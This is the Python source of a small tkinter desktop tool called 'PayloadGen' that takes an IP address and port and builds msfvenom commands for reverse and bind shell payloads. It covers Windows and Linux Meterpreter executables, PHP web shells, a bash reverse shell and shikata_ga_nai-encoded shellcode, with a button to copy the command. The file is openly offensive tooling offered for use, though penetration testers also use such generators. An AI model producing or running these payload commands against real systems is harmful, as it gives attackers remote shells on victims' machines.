import tkinter as tk
from tkinter import *
from tkinter import messagebox

# GUI design
root = Tk()
root.title("PayloadGen: Dynamic Reverse Shell Payload Creator")
root.resizable(False, False)
root.geometry("950x700+500+200")
root.configure(bg="black")

# Icon
icon = PhotoImage(file="logo.png")
root.iconphoto(True, icon)

# Logo
logo = PhotoImage(file="logo.png")
Label(root, image=logo, bg="black").place(x=175, y=7)
Label(root, text="PayloadGen", bd=3, bg="black", fg="red", font="arial 30 bold").place(x=270, y=20)

# Password label
lhost_label = tk.Label(root, text="IP:", bd=5, fg="white", bg="black", font="arial 12 bold")
lhost_label.place(x=140, y=140)

lport_label = tk.Label(root, text="PORT:", bd=5, fg="white", bg="black", font="arial 12 bold")
lport_label.place(x=500, y=140)

# Text box
lhost_entry = tk.Entry(root, show="", bd=5, fg="black", bg="white", font="arial 12 bold")
lhost_entry.place(x=170, y=140)

lport_entry = tk.Entry(root, show="", bd=5, fg="black", bg="white", font="arial 12 bold")
lport_entry.place(x=560, y=140)

generate_button = tk.Button(root, text="Generate Payload", font="arial 13 bold", fg="black", bg="light green",
                            command=lambda: generate_reverse_shell_payload())
generate_button.place(x=370, y=300)

copy_button = tk.Button(root, text="Copy", font="arial 13 bold", fg="black", bg="yellow", command=lambda: copy_to_clipboard())
copy_button.place(x=430, y=430)

# Result text
result_text = tk.Text(root, height=2, width=80, bd=5, font="arial 12 bold")
result_text.place(x=100, y=350)

# Create and position the payload selection dropdown
msf_payloads = [

    "Select MSFVenom Payload: ",
    "Windows Meterpreter Staged Reverse TCP(x64)",
    "Windows Meterpreter Stageless Reverse TCP(x64)",
    "Windows Staged Reverse TCP(x64)",
    "Windows Stageless Reverse TCP(x64)",
    "Linux Meterpreter Staged Reverse TCP(x64)",
    "Linux Stageless Reverse TCP(x64)",
    "Windows Bind TCP ShellCode",
    "PHP Meterpreter Stageless Reverse TCP",
    "PHP Reverse PHP",
    "Bash Stageless Reverse TCP",
]
msf_var = tk.StringVar(root)
msf_var.set(msf_payloads[0])  # Set default value
msf_dropdown = tk.OptionMenu(root, msf_var, *msf_payloads)
msf_dropdown.configure(font="arial 10 bold", fg="skyblue", bg="black")
msf_dropdown.pack()
msf_dropdown.place(x=330, y=230)
def generate_reverse_shell_payload():
    lhost = lhost_entry.get()
    lport = lport_entry.get()
    msfpayload = msf_var.get()

    if msfpayload == msf_payloads[1]:
        payload_command = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe -o reverse.exe".format(lhost, lport)

    elif msfpayload == msf_payloads[2]:
        payload_command = "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={} LPORT={} -f exe -o reverse.exe".format(lhost, lport)

    elif msfpayload == msf_payloads[3]:
        payload_command = "msfvenom -p windows/x64/shell/reverse_tcp LHOST={} LPORT={} -f exe -o reverse.exe".format(lhost, lport)

    elif msfpayload == msf_payloads[4]:
        payload_command = "msfvenom -p windows/x64/shell_reverse_tcp LHOST={} LPORT={} -f exe -o reverse.exe".format(lhost, lport)

    elif msfpayload == msf_payloads[5]:
        payload_command = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf -o reverse.elf".format(lhost, lport)

    elif msfpayload == msf_payloads[6]:
        payload_command = "msfvenom -p linux/x64/shell_reverse_tcp LHOST={} LPORT={} -f elf -o reverse.elf".format(lhost, lport)

    elif msfpayload == msf_payloads[7]:
        payload_command = "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '' -f python -v notBuf -o shellcode".format(
            lhost, lport)

    elif msfpayload == msf_payloads[8]:
        payload_command = "msfvenom -p php/meterpreter_reverse_tcp LHOST={} LPORT={} -f raw -o shell.php".format(lhost, lport)

    elif msfpayload == msf_payloads[9]:
        payload_command = "msfvenom -p php/reverse_php LHOST={} LPORT={} -o shell.php".format(lhost, lport)

    elif msfpayload == msf_payloads[10]:
        payload_command = "msfvenom -p cmd/unix/reverse_bash LHOST={} LPORT={} -f raw -o shell.sh".format(lhost, lport)

    else:
        payload_command = "Make a valid selection"

    # Delete existing text in box
    result_text.delete(1.0, END)

    # Inserting text in textbox
    result_text.insert(END, payload_command)


# Function to copy text to clipboard
def copy_to_clipboard():
    text = result_text.get("1.0", "end-1c")  # Get the text from the text box
    root.clipboard_clear()  # Clear the clipboard
    root.clipboard_append(text)  # Copy the text to the clipboard
    messagebox.showinfo("Success", "Text copied to clipboard!")


root.mainloop()
